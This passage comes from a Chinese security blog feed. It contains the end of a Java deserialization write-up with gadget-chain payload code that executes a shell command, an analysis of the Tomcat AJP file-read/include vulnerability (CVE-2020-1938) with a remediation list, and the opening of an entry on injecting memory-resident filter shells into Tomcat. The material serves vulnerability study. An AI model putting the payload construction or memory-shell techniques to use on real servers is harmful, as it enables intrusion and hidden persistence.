<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">toString(), CoffeeBean (com.example.b4bycoffee.model)</span><br><span class="line">equals(Object), XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals(Object), ObjectIdGenerator$IdKey (com.fasterxml.jackson.annotation)</span><br><span class="line">readObject(ObjectInputStream), ConcurrentHashMap (java.util.concurrent)</span><br></pre></td></tr></table></figure>



<p>当然也可以把ConcurrentHashMap换成hashMap：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">Tool.setFieldValue(coffeeBean, <span class="string">&quot;ClassByte&quot;</span>, Tool.getCMDByteCodes(<span class="string">&quot;touch /tmp/success&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">ObjectIdGenerator.<span class="type">IdKey</span> <span class="variable">idKey1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectIdGenerator</span>.IdKey(Object.class,Object.class,xString);</span><br><span class="line">ObjectIdGenerator.<span class="type">IdKey</span> <span class="variable">idKey2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectIdGenerator</span>.IdKey(Object.class,Object.class,coffeeBean);</span><br><span class="line">Tool.setFieldValue(idKey1,<span class="string">&quot;hashCode&quot;</span>,<span class="number">0</span>);</span><br><span class="line">Tool.setFieldValue(idKey2,<span class="string">&quot;hashCode&quot;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">hashMap.put(idKey1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">hashMap.put(idKey2, <span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tool.encodeBase64(Tool.serialize(hashMap));</span><br></pre></td></tr></table></figure>

<p>调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">toString(), CoffeeBean (com.example.b4bycoffee.model)</span><br><span class="line">equals(Object), XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals(Object), ObjectIdGenerator$IdKey (com.fasterxml.jackson.annotation)</span><br><span class="line">putVal(int, Object, Object, boolean, boolean), HashMap (java.util)</span><br><span class="line">readObject(ObjectInputStream), HashMap (java.util)</span><br></pre></td></tr></table></figure>







<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/2041/">基于代码属性图的自动化漏洞挖掘实践</a></p>
<p><a href="https://yml-sec.top/2022/11/30/tabby%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/">tabby在CTF中的运用</a></p>
]]></content>
      <tags>
        <tag>Java反序列化漏洞</tag>
        <tag>Tabby</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat Ajp协议漏洞</title>
    <url>/2020/03/26/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>Tomcat主要是提供Servlet&#x2F;JSP容器，静态资源的处理速度以及Web服务管理功能方面不如其他专业的HTTP服务器，所以使用效率和性能更高二进制TCP传输协议ajp协议以供其他web服务器进行反向代理或者用于集群，而8009端口的ajp服务默认在公网开启，通过ajp协议可以控制request对象的某些Attribute属性从而造成webapps目录下的任意文件读取&#x2F;包含</p>
<span id="more"></span>

<h2 id="IDEA调试Tomcat"><a href="#IDEA调试Tomcat" class="headerlink" title="IDEA调试Tomcat"></a>IDEA调试Tomcat</h2><p>github下载存在漏洞的版本<a href="https://github.com/apache/tomcat/releases/tag/9.0.19">https://github.com/apache/tomcat/releases/tag/9.0.19</a></p>
<p>解压源码后，在源码根目录新建 home 文件夹，把 conf 文件夹和 webapps 文件夹移动到 home 文件夹里，然后在源码根目录新建 pom.xml 文件（原来为 Ant 工程，这里把它改为 Maven 工程）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>tomcat<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.19<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.ant<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ant<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>wsdl4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>wsdl4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;--&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--&lt;groupId&gt;javax.xml&lt;/groupId&gt;--&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--&lt;artifactId&gt;jaxrpc&lt;/artifactId&gt;--&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--&lt;version&gt;1.1&lt;/version&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;/dependency&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.geronimo.specs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>geronimo-jaxrpc_1.1_spec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;groupId&gt;org.eclipse.jdt.core.compiler&lt;/groupId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;artifactId&gt;ecj&lt;/artifactId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;version&gt;4.5&lt;/version&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.jdt<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ecj<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.17.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.easymock<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>easymock<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326102909478.png" alt="image-20200326102909478"></p>
<p>用IDEA导入</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326103304189.png" alt="image-20200326103304189"></p>
<p>将java文件夹标记为Sources Root，test标记为Test Sources Root</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326103548188.png" alt="image-20200326103548188"></p>
<p>运行org.apache.catalina.startup.Bootstrap#main方法</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326103949800.png" alt="image-20200326103949800"></p>
<p>找不到trailers，把 home&#x2F;webapps&#x2F;examples&#x2F;WEB-INF&#x2F;classes&#x2F;trailers 目录拷贝到 test 目录下</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326104556122.png" alt="image-20200326104556122"></p>
<p>再次运行，找不到CookieFilter，把 home&#x2F;webapps&#x2F;examples&#x2F;WEB-INF&#x2F;classes&#x2F;util&#x2F;CookieFilter.java 文件拷贝到 test&#x2F;util 目录下<br><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326104920331.png" alt="image-20200326104920331"></p>
<p>conf&#x2F;server.xml 找不到，设置下 jvm 参数（就是指定之前创建的 home 目录）</p>
<p><code>-Dcatalina.home=</code></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326110137180.png" alt="image-20200326110137180"></p>
<p>访问网页报错</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326110306603.png" alt="image-20200326110306603"></p>
<p>删除webapps &#x2F;examples文件夹</p>
<p>编辑org.apache.catalina.startup.ContextConfig#configureStart方法，添加初始化 JSP 解析器的代码</p>
<p><code>context.addServletContainerInitializer(new JasperInitializer(), null);</code></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326110641559.png" alt="image-20200326110641559"></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326110809101.png" alt="image-20200326110809101"></p>
<h2 id="Tomcat-Ajp协议"><a href="#Tomcat-Ajp协议" class="headerlink" title="Tomcat Ajp协议"></a>Tomcat Ajp协议</h2><p>Tomcat默认的conf&#x2F;server.xml中配置了2个Connector</p>
<p>一个为8080端口的HTTP协议，另外一个就是8009端口的AJP协议</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326114142570.png" alt="image-20200326114142570"></p>
<p>Tomcat最主要的功能是提供Servlet&#x2F;JSP容器，尽管它也可以作为独立的Java Web服务器，但它在对静态资源（如HTML文件或图像文件）的处理速度，以及提供的Web服务器管理功能方面都不如其他专业的HTTP服务器，如IIS和Apache的服务器。因此在实际应用中，常常把Tomcat的与其他HTTP服务器集成。对于不支持的Servlet&#x2F;JSP的HTTP服务器，可以通过的Tomcat服务器来运行的Servlet&#x2F;JSP组件。而Tomcat和其他服务器的集成，就是通过ajp协议来完成的</p>
<p>ajp是一个二进制的TCP传输协议，相比HTTP这种纯文本的协议来说，效率和性能更高，也做了很多优化。显然，浏览器并不能直接支持ajp协议，只支持HTTP协议。所以通常是通过Apache的proxy_ajp模块进行反向代理，暴露成http协议给客户端访问</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326115020723.png" alt="image-20200326115020723"></p>
<p>Debug运行Tomcat，nc 尝试连接可以看到8009端口开放</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326125943121.png" alt="image-20200326125943121"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>Tomcat在处理ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor#prepareRequest来解析一些请求头</p>
<p>在该处下断点，并利用poc发送ajp请求</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326150114592.png" alt="image-20200326150114592"></p>
<p>org&#x2F;apache&#x2F;coyote&#x2F;ajp&#x2F;AjpProcessor.java</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326151300045.png" alt="image-20200326151300045"></p>
<p>当ajp数据包的头设置为<code>SC_REQ_ATTRIBUTE</code>时,Connector会紧接着读取变量<code>n</code>（属性名）和<code>v</code>（值），当<code>n</code>不是<code>SC_A_REQ_LOCAL_ADDR</code>、<code>SC_A_REQ_REMOTE_PORT</code>、<code>SC_A_SSL_PROTOCOL</code>时，就会用<code>v</code>来赋值属性<code>n</code></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326151900051.png" alt="image-20200326151900051"></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326151918810.png" alt="image-20200326151918810"></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326151932440.png" alt="image-20200326151932440"></p>
<p>接着，<code>service()</code>方法将修改过的request代入后面的调用</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326151535450.png" alt="image-20200326151535450"></p>
<p>poc请求的url为&#x2F;asdf</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326152237580.png" alt="image-20200326152237580"></p>
<p>当请求的uri无法匹配其他servlet时会由DefaultServlet处理，其中的调用流程如下</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326152441914.png" alt="image-20200326152441914"></p>
<p>在<code>org.apache.catalina.servlets.DefaultServlet</code>中，当我们的请求声明的是GET方法时，存在调用<code>service()-&gt;doGet()-&gt;serveResource()</code></p>
<p>org.apache.catalina.servlets.DefaultServlet#serveResource</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326152624852.png" alt="image-20200326152624852"></p>
<p>org.apache.catalina.servlets.DefaultServlet#getRelativePath</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326153216070.png" alt="image-20200326153216070"></p>
<p><code>serveResource()</code>方法获得path后会将<code>path</code>带入到<code>getResource</code>方法中造成任意文件读取</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326153814678.png" alt="image-20200326153814678"></p>
<p>之后的代码逻辑是把通过path获取的资源序列化输出，因此客户端再按照AJP协议解析数据包就能得到文件内容</p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>Tomcat默认将jsp&#x2F;jspx结尾的请求交给<code>org.apache.jasper.servlet.JspServlet</code>处理</p>
<p>修改一下POC，将请求url改为jsp结尾</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326160730549.png" alt="image-20200326160730549"></p>
<p>WEB-INF下新建一个文件</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326160942966.png" alt="image-20200326160942966"></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326161040592.png" alt="image-20200326161040592"></p>
<p>在org.apache.jasper.servlet.JspServlet#service下断点</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326161648547.png" alt="image-20200326161648547"></p>
<p>这里同样会获取javax.servlet.include.path_info、javax.servlet.include.servlet_path这两个属性（可以通过ajp协议控制这两个属性）</p>
<p>将这两个属性 对应的值拼接到jspURi变量中，最后交给serviceJspFile方法处理</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326161818325.png" alt="image-20200326161818325"></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326161856522.png" alt="image-20200326161856522"></p>
<h2 id="可读路径"><a href="#可读路径" class="headerlink" title="可读路径"></a>可读路径</h2><h3 id="文件读取-1"><a href="#文件读取-1" class="headerlink" title="文件读取"></a>文件读取</h3><p>该漏洞只能读取webapps目录下的文件，不能通过目录穿越读取其他路径</p>
<p>尝试在paylaod中加入..&#x2F;</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326164001646.png" alt="image-20200326164001646"></p>
<p>步入DefaultServlet中调用的getResource</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326164040472.png" alt="image-20200326164040472"></p>
<p>org.apache.catalina.webresources.StandardRoot#getResource</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326164128950.png" alt="image-20200326164128950"></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326164157798.png" alt="image-20200326164157798"></p>
<p>org.apache.catalina.webresources.StandardRoot#validate</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326164647071.png" alt="image-20200326164647071"></p>
<p>org.apache.tomcat.util.http.RequestUtil#normalize(java.lang.String, boolean)</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326165032990.png" alt="image-20200326165032990"></p>
<p>其中检测到了&#x2F;..&#x2F;就会return null</p>
<p>在org&#x2F;apache&#x2F;catalina&#x2F;webresources&#x2F;StandardRoot抛出异常</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326165249071.png" alt="image-20200326165249071"></p>
<h3 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h3><p>先修改一下POC</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326165724644.png" alt="image-20200326165724644"></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326170101382.png" alt="image-20200326170101382"></p>
<p>跟入</p>
<p>org.apache.jasper.servlet.JspServlet#serviceJspFile</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326165837963.png" alt="image-20200326165837963"></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326165918980.png" alt="image-20200326165918980"></p>
<p>跟着jspUri变量，会发现后面就进入了和文件读取一样的检测逻辑</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326170508191.png" alt="image-20200326170508191"></p>
<h3 id="跨webapp读取-包含"><a href="#跨webapp读取-包含" class="headerlink" title="跨webapp读取&#x2F;包含"></a>跨webapp读取&#x2F;包含</h3><p>目前都是读取默认的ROOT下的文件，如果想跨webapp读取，可以修改POC中的请求url</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326170809752.png" alt="image-20200326170809752"></p>
<p>创建test目录并写入文件</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326171827276.png" alt="image-20200326171827276"></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326171840099.png" alt="image-20200326171840099"></p>
<p>修改POC，url中换成test目录，并且后面跟随随机字符（当请求的uri无法匹配其他servlet时才会由DefaultServlet处理）</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326172233725.png" alt="image-20200326172233725"></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326172326694.png" alt="image-20200326172326694"></p>
<p>修改POC，包含文件并执行</p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326172506497.png" alt="image-20200326172506497"></p>
<p><img src="/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/image-20200326172452719.png" alt="image-20200326172452719"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
<li><p>升级最新版本</p>
</li>
<li><p>禁用AJP协议</p>
<p>删除或注释conf&#x2F;server.xml中的</p>
<p><code>&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</code></p>
</li>
<li><p>配置secret来设置AJP协议的认证凭证</p>
<p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt;</code></p>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">CNVD-2020-10487-Tomcat-Ajp-lfi</a></p>
<p><a href="https://www.cnblogs.com/jhxxb/p/10768580.html">IDEA 导入 Tomcat9 源码</a></p>
<p><a href="https://www.freebuf.com/vuls/228111.html">Tomcat-Ajp漏洞：我是如何一步步写出POC的？</a></p>
<p><a href="https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html">The Apache Tomcat Connectors - AJP Protocol Reference</a></p>
<p><a href="https://blog.csdn.net/jeikerxiao/article/details/82745516">Tomcat HTTP协议与AJP协议</a></p>
<p><a href="https://xz.aliyun.com/t/7325">Tomcat Ajp协议文件包含漏洞分析</a></p>
<p><a href="http://www.liuhaihua.cn/archives/665301.html">Tomcat-Ajp协议漏洞分析(CVE-2020-1938)</a></p>
]]></content>
      <tags>
        <tag>Tomcat</tag>
        <tag>ajp</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat 运行时动态添加删除filter</title>
    <url>/2020/05/28/Tomcat-%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0%E5%88%A0%E9%99%A4filter/</url>
    <content><![CDATA[<p>最近工作需要在写tomcat内存马，使用的方法便是动态插入filter，有个需求就是插入之后还需要能控制将其删除，于是有了下文tomcat 运行时动态添加删除filter</p>
<span id="more"></span>

<h2 id="动态添加filter"><a href="#动态添加filter" class="headerlink" title="动态添加filter"></a>动态添加filter</h2><p><a href="/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8Cfilter">运行时动态添加filter</a></p>
